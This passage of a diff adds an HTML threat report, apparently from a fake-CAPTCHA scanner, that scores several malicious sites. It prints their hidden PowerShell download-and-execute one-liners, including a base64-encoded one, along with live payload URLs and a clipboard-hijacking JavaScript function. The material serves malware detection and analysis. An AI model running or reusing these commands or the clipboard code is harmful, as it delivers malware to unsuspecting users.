+            </div>
+        </div>
+        
+        <div class="site-card" data-url="https://www.website.mypetapp.co.za/">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">https://www.website.mypetapp.co.za/</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            47 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-critical">Score: 340</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">PowerShell</span>
+                        
+                        <span class="attack-type-badge">Clipboard Hijacking</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-3')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-3')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-3')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-3" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">powershell</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">4</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">7</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">base64</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">2</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">high risk commands</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-3" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            💻 PowerShell Commands
+                            <span class="indicator-count">3</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">POWerShEll -W h &#34;[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#39;aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50&#39;)) | iex&#34;`;</div>
+                            
+                            <div class="indicator-item">iex (iwr &#39;https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt&#39; -UseBasicParsing)</div>
+                            
+                            <div class="indicator-item">iwr </div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">21</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">CAPTCHA Verification</div>
+                            
+                            <div class="indicator-item">Verification ID</div>
+                            
+                            <div class="indicator-item">I am not a robot</div>
+                            
+                            <div class="indicator-item">captcha-box</div>
+                            
+                            <div class="indicator-item">captcha-iogo</div>
+                            
+                            <div class="indicator-item">captcha</div>
+                            
+                            <div class="indicator-item">CAPTCHA-iogo</div>
+                            
+                            <div class="indicator-item">CAPTCHA</div>
+                            
+                            <div class="indicator-item">CaptchaListeners</div>
+                            
+                            <div class="indicator-item">CaptchaCheckbox</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🌐 Extracted URLs
+                            <span class="indicator-count">2</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">https://use.fontawesome.com/releases/v5.0.0/css/all.css</div>
+                            
+                            <div class="indicator-item">https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</div>
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-3" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...tempTextArea.select(); document.execCommand(&#34;copy&#34;); document.body.removeChild(tempText...</pre>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...k&#34;, function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = &#34;visible&#34;; checkboxBtnSpinner.style.opacity = &#34;1&#34;; checkboxBtnSpinner.style.animation = &#34;spin 1s linear infinite&#34;; } function hideCaptchaLoading...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="site-card" data-url="https://website.mypetapp.co.za/">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">https://website.mypetapp.co.za/</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            47 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-critical">Score: 340</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">PowerShell</span>
+                        
+                        <span class="attack-type-badge">Clipboard Hijacking</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-4')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-4')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-4')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-4" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">powershell</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">4</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">7</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">base64</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">2</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">high risk commands</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-4" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            💻 PowerShell Commands
+                            <span class="indicator-count">3</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">POWerShEll -W h &#34;[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#39;aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50&#39;)) | iex&#34;`;</div>
+                            
+                            <div class="indicator-item">iex (iwr &#39;https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt&#39; -UseBasicParsing)</div>
+                            
+                            <div class="indicator-item">iwr </div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">21</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">CAPTCHA Verification</div>
+                            
+                            <div class="indicator-item">Verification ID</div>
+                            
+                            <div class="indicator-item">I am not a robot</div>
+                            
+                            <div class="indicator-item">captcha-box</div>
+                            
+                            <div class="indicator-item">captcha-iogo</div>
+                            
+                            <div class="indicator-item">captcha</div>
+                            
+                            <div class="indicator-item">CAPTCHA-iogo</div>
+                            
+                            <div class="indicator-item">CAPTCHA</div>
+                            
+                            <div class="indicator-item">CaptchaListeners</div>
+                            
+                            <div class="indicator-item">CaptchaCheckbox</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🌐 Extracted URLs
+                            <span class="indicator-count">2</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">https://use.fontawesome.com/releases/v5.0.0/css/all.css</div>
+                            
+                            <div class="indicator-item">https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</div>
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-4" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...tempTextArea.select(); document.execCommand(&#34;copy&#34;); document.body.removeChild(tempText...</pre>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...k&#34;, function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = &#34;visible&#34;; checkboxBtnSpinner.style.opacity = &#34;1&#34;; checkboxBtnSpinner.style.animation = &#34;spin 1s linear infinite&#34;; } function hideCaptchaLoading...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="site-card" data-url="https://blessdayservices.org/up/">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">https://blessdayservices.org/up/</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            45 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-critical">Score: 295</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">PowerShell</span>
+                        
+                        <span class="attack-type-badge">Clipboard Hijacking</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-5')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-5')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-5')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-5" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">powershell</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">4</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">1</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">downloads</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">4</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">1</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">high risk commands</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-5" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            💻 PowerShell Commands
+                            <span class="indicator-count">3</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">powershell -ArgumentList &#39;-w hidden -c iwr https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1 | iex&#39; -WindowStyle Hidden\&#34;&#34;;</div>
+                            
+                            <div class="indicator-item">powershell &#34; + htaPath;</div>
+                            
+                            <div class="indicator-item">iwr </div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">20</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">CAPTCHA Verification</div>
+                            
+                            <div class="indicator-item">Verification Hash</div>
+                            
+                            <div class="indicator-item">I am not a robot</div>
+                            
+                            <div class="indicator-item">CAPTCHA</div>
+                            
+                            <div class="indicator-item">captcha-iogo</div>
+                            
+                            <div class="indicator-item">captcha</div>
+                            
+                            <div class="indicator-item">CAPTCHA-iogo</div>
+                            
+                            <div class="indicator-item">CaptchaListeners</div>
+                            
+                            <div class="indicator-item">CaptchaCheckbox</div>
+                            
+                            <div class="indicator-item">CaptchaLoading</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🌐 Extracted URLs
+                            <span class="indicator-count">5</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">https://use.fontawesome.com/releases/v5.0.0/css/all.css</div>
+                            
+                            <div class="indicator-item">https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</div>
+                            
+                            <div class="indicator-item">https://www.google.com/intl/en/policies/privacy/</div>
+                            
+                            <div class="indicator-item">https://www.google.com/intl/en/policies/terms/</div>
+                            
+                            <div class="indicator-item">https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1</div>
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-5" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...); tempTextArea.select(); document.execCommand(&#34;copy&#34;); document.body.removeChild(tempTextA...</pre>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...ck&#34;, function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = &#34;visible&#34;; checkboxBtnSpinner.style.opacity = &#34;1&#34;; checkboxBtnSpinner.style.animation = &#34;spin 1s linear infinite&#34;; } function hideCaptchaLoadin...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="site-card" data-url="http://101.32.40.22/">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">http://101.32.40.22/</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            34 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-critical">Score: 178</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">Clipboard Hijacking</span>
+                        
+                        <span class="attack-type-badge">Fake CAPTCHA</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-6')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-6')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-6')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-6" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">4</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">4</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-6" class="tab-content">
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">18</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">CAPTCHA Verification</div>
+                            
+                            <div class="indicator-item">Verification ID</div>
+                            
+                            <div class="indicator-item">I am not a robot</div>
+                            
+                            <div class="indicator-item">CAPTCHA</div>
+                            
+                            <div class="indicator-item">captcha-iogo</div>
+                            
+                            <div class="indicator-item">captcha</div>
+                            
+                            <div class="indicator-item">CAPTCHA-iogo</div>
+                            
+                            <div class="indicator-item">CaptchaListeners</div>
+                            
+                            <div class="indicator-item">CaptchaCheckbox</div>
+                            
+                            <div class="indicator-item">CaptchaLoading</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🌐 Extracted URLs
+                            <span class="indicator-count">4</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">https://use.fontawesome.com/releases/v5.0.0/css/all.css</div>
+                            
+                            <div class="indicator-item">https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</div>
+                            
+                            <div class="indicator-item">https://www.google.com/intl/en/policies/privacy/</div>
+                            
+                            <div class="indicator-item">https://www.google.com/intl/en/policies/terms/</div>
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-6" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...); tempTextArea.select(); document.execCommand(&#34;copy&#34;); document.body.removeChild(tempTextA...</pre>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...ck&#34;, function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = &#34;visible&#34;; checkboxBtnSpinner.style.opacity = &#34;1&#34;; checkboxBtnSpinner.style.animation = &#34;spin 1s linear infinite&#34;; } function hideCaptchaLoadin...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    
+</section>
+
+<!-- Technical Analysis Section -->
+
+<section class="analysis-section">
+    <h2 style="font-size: 1.75rem; font-weight: 600; margin-bottom: 2rem;">Technical Analysis</h2>
+    <div class="analysis-content">
+        <h1>ClickGrab Threat Analysis Report - 2025-09-11</h1>
+<p><em>Generated on 2025-09-11 02:16:43</em></p>
+<h2>Executive Summary</h2>
+<ul>
+<li><strong>Total sites analyzed</strong>: 10</li>
+<li><strong>Sites with malicious content</strong>: 6</li>
+<li><strong>Unique domains encountered</strong>: 12</li>
+<li><strong>Total URLs extracted</strong>: 41</li>
+<li><strong>PowerShell download attempts</strong>: 1</li>
+<li><strong>Clipboard manipulation instances</strong>: 18</li>
+</ul>
+<h2>Domain Analysis</h2>
+<h3>Most Frequently Encountered Domains</h3>
+<ul>
+<li><strong>www.google.com</strong>: 10 occurrences</li>
+<li><strong>www.webgo.de</strong>: 10 occurrences</li>
+<li><strong>use.fontawesome.com</strong>: 6 occurrences</li>
+<li><strong>twitter.com</strong>: 3 occurrences</li>
+<li><strong>www.facebook.com</strong>: 2 occurrences</li>
+<li><strong>plus.google.com</strong>: 2 occurrences</li>
+<li><strong>vk.com</strong>: 2 occurrences</li>
+<li><strong>instagram.com</strong>: 2 occurrences</li>
+<li><strong>irp.cdn-website.com</strong>: 1 occurrences</li>
+<li><strong>t.me</strong>: 1 occurrences</li>
+<li><strong>www.1c-bitrix.ru</strong>: 1 occurrences</li>
+<li><strong>marketplace.1c-bitrix.ru</strong>: 1 occurrences</li>
+</ul>
+<h2>URL Pattern Analysis</h2>
+<h3>reCAPTCHA imagery</h3>
+<p><em>6 occurrences across 1 distinct URLs</em></p>
+<ul>
+<li><code>https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</code> (6 times)</li>
+</ul>
+<h3>Font resources</h3>
+<p><em>6 occurrences across 1 distinct URLs</em></p>
+<ul>
+<li><code>https://use.fontawesome.com/releases/v5.0.0/css/all.css</code> (6 times)</li>
+</ul>
+<h3>CDN hosted scripts</h3>
+<p><em>1 occurrences across 1 distinct URLs</em></p>
+<ul>
+<li><code>https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1</code> (1 times)</li>
+</ul>
+<h3>Google resources</h3>
+<p><em>12 occurrences across 4 distinct URLs</em></p>
+<ul>
+<li><code>https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</code> (6 times)</li>
+<li><code>https://www.google.com/intl/en/policies/privacy/</code> (2 times)</li>
+<li><code>https://www.google.com/intl/en/policies/terms/</code> (2 times)</li>
+<li><code>https://plus.google.com/111119180387208976312/</code> (2 times)</li>
+</ul>
+<h2>Suspicious Keyword Analysis</h2>
+<p><strong>Total Keywords Found</strong>: 128 (27 unique)</p>
+<h3>Keyword Categories</h3>
+<h4>Social Engineering</h4>
+<p><em>21 unique keywords</em></p>
+<ul>
+<li><code>robot</code></li>
+<li><code>captcha-iogo</code></li>
+<li><code>captcha-box</code></li>
+<li><code>CaptchaCheckbox</code></li>
+<li><code>Verification</code></li>
+<li><code>CAPTCHA Verification</code></li>
+<li><code>verification-id</code></li>
+<li><code>CAPTCHA</code></li>
+<li><code>CAPTCHA-iogo</code></li>
+<li><code>To better prove you are not a robot</code></li>
+<li><em>...and 11 more</em></li>
+</ul>
+<h4>System Commands</h4>
+<p><em>1 unique keywords</em></p>
+<ul>
+<li><code>PowErsHeLL</code></li>
+</ul>
+<h4>Verification Text</h4>
+<p><em>3 unique keywords</em></p>
+<ul>
+<li><code>hidden</code></li>
+<li><code>hiddEn</code></li>
+<li><code>Hidden</code></li>
+</ul>
+<h4>Technical Terms</h4>
+<p><em>2 unique keywords</em></p>
+<ul>
+<li><code>iex</code></li>
+<li><code>mshta</code></li>
+</ul>
+<h3>Most Frequent Keywords</h3>
+<ul>
+<li><strong>robot</strong>: 7 occurrences</li>
+<li><strong>hidden</strong>: 7 occurrences</li>
+<li><strong>CAPTCHA Verification</strong>: 6 occurrences</li>
+<li><strong>I am not a robot</strong>: 6 occurrences</li>
+<li><strong>CAPTCHA</strong>: 6 occurrences</li>
+<li><strong>captcha-iogo</strong>: 6 occurrences</li>
+<li><strong>captcha</strong>: 6 occurrences</li>
+<li><strong>CAPTCHA-iogo</strong>: 6 occurrences</li>
+<li><strong>CaptchaListeners</strong>: 6 occurrences</li>
+<li><strong>CaptchaCheckbox</strong>: 6 occurrences</li>
+<li><strong>CaptchaLoading</strong>: 6 occurrences</li>
+<li><strong>Robot</strong>: 6 occurrences</li>
+<li><strong>Verification</strong>: 6 occurrences</li>
+<li><strong>verification-id</strong>: 6 occurrences</li>
+<li><strong>verification_id</strong>: 6 occurrences</li>
+</ul>
+<h3>Similar Keyword Patterns</h3>
+<p><em>Groups of keywords that appear to be variations of the same theme:</em></p>
+<p><strong>Group 1</strong>: <code>CAPTCHA Verification</code>, <code>Verification</code>, <code>verification</code>, <code>captcha-verify</code></p>
+<p><strong>Group 2</strong>: <code>Verification Hash</code>, <code>verification-id</code>, <code>verification_id</code>, <code>Verification ID</code></p>
+<p><strong>Group 3</strong>: <code>CAPTCHA</code>, <code>captcha-iogo</code>, <code>captcha</code>, <code>CAPTCHA-iogo</code>, <code>captcha-box</code></p>
+<p><strong>Group 4</strong>: <code>Robot</code>, <code>robot</code></p>
+<p><strong>Group 5</strong>: <code>Hidden</code>, <code>hidden</code>, <code>hiddEn</code></p>
+<h2>JavaScript Obfuscation Analysis</h2>
+<p><strong>Obfuscation Sophistication Score</strong>: 0/7</p>
+<h3>Potential Base64 Encoded Content</h3>
+<p><em>These strings may contain encoded malicious payloads:</em></p>
+<ul>
+<li><code>com/recaptcha/about/images/reCAPTCHA</code></li>
+</ul>
+<h2>Clipboard Manipulation Analysis</h2>
+<p>Detected clipboard manipulation in <strong>18</strong> instances.</p>
+<h3>Document.Execcommand Copy</h3>
+<p>Found in <strong>18</strong> snippets (100.0% of clipboard code)</p>
+<p><strong>Examples:</strong></p>
+<pre class="codehilite"><code class="language-javascript">document.execCommand(&quot;copy&quot;)
+</code></pre>
+
+<h3>Textarea Manipulation</h3>
+<p>Found in <strong>18</strong> snippets (100.0% of clipboard code)</p>
+<p><strong>Examples:</strong></p>
+<pre class="codehilite"><code class="language-javascript">ipboardCopyData(textToCopy){ const tempTextArea = document.createElement(&quot;textarea&quot;
+</code></pre>
+
+<h3>Complete Malicious Functions</h3>
+<p><strong>Function 1:</strong></p>
+<pre class="codehilite"><code class="language-javascript">function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement(&quot;textarea&quot;); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand(&quot;copy&quot;); document.body.removeChild(tempTextArea); }
+</code></pre>
+
+<h2>Clipboard Attack Flow Analysis</h2>
+<p><strong>Attack Sophistication</strong>: 6/7 components detected
+<strong>Total Technique Instances</strong>: 78</p>
+<h3>Attack Flow Components</h3>
+<p><em>The following components show how the clipboard attack is executed:</em></p>
+<h4>Element Creation</h4>
+<p><em>Creating temporary DOM elements</em></p>
+<p><strong>Instances</strong>: 6
+<strong>Examples</strong>: <code>createElement("textarea"</code></p>
+<h4>Content Injection</h4>
+<p><em>Injecting malicious content into elements</em></p>
+<p><strong>Instances</strong>: 6
+<strong>Examples</strong>: <code>.value =</code></p>
+<h4>DOM Manipulation</h4>
+<p><em>Adding elements to the DOM</em></p>
+<p><strong>Instances</strong>: 18
+<strong>Examples</strong>: <code>append(</code>, <code>body.append</code></p>
+<h4>Selection Methods</h4>
+<p><em>Selecting content for copying</em></p>
+<p><strong>Instances</strong>: 18
+<strong>Examples</strong>: <code>.select()</code></p>
+<h4>Clipboard Operations</h4>
+<p><em>Executing clipboard copy operations</em></p>
+<p><strong>Instances</strong>: 18
+<strong>Examples</strong>: <code>execCommand("copy"</code></p>
+<h4>Cleanup Operations</h4>
+<p><em>Removing temporary elements</em></p>
+<p><strong>Instances</strong>: 12
